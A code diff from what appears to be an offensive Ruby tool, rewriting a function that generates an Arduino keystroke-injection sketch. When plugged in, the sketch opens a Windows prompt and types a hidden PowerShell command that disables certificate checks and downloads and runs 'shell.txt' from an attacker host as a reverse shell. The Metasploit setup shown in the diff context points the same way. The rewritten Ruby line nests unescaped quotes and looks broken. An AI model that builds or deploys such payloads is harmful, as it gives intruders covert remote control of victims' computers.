@@ -88,24 +88,37 @@ def shell_setup(encoded)
 end
 
 def arduino_setup(host)
-  print_info("Writing Arduino sketch")
-  s = <<~SKETCH
-    #include <Keyboard.h>
-    void setup() {
-      Keyboard.begin();
-      delay(1000);
-      Keyboard.press(KEY_LEFT_GUI); delay(500);
-      Keyboard.press('r'); delay(500);
-      Keyboard.releaseAll(); delay(500);
-      Keyboard.print("powershell -windowstyle hidden \\\"[system.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://#{host}/shell.txt')\\\"");
-      Keyboard.press(KEY_RETURN); delay(500);
-      Keyboard.releaseAll();
-      Keyboard.end();
-    }
-    void loop() {}
-  SKETCH
-  File.write("reverse_shell_arduino_termux.txt", s)
-  print_success("Arduino sketch saved to reverse_shell_arduino_termux.txt")
+print_info("Writing Arduino Sketch File\n")
+s = "#include <Keyboard.h>\n"
+s << "void setup()\n"
+s << "{\n"
+s << "Keyboard.begin();\n"
+s << "Keyboard.press(KEY_LEFT_GUI);\n"
+s << "delay(1000);\n"
+s << "Keyboard.press('x');\n"
+s << "Keyboard.releaseAll();\n"
+s << "delay(500);\n"
+s << "typeKey('a');\n"
+s << "delay(100);\n"
+s << "Keyboard.press(KEY_LEFT_ALT);\n"
+s << "delay(500);\n"
+s << "Keyboard.press('y');\n"
+s << "Keyboard.releaseAll();\n"
+s << "delay(500);\n"
+s << "Keyboard.print("powershell -windowstyle hidden \"[system.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://#{host}/shell.txt')\"");\n"
+s << "typeKey(KEY_RETURN);\n"
+s << "Keyboard.end();\n"
+s << "}\n"
+s << "void loop() {}\n"
+s << "void typeKey(int key){\n"
+s << "Keyboard.press(key);\n"
+s << "delay(500);\n"
+s << "Keyboard.release(key);\n"
+s << "}"
+File.open('reverse_shell_arduino_termux.txt', 'w') do |f|
+f.write(s)
+end
+print_success("Arduino Sketch File Complete Please Find 'reverse_shell_arduino_termux.txt'\n")
 end
 
 def metasploit_setup(msf_path, host, port)
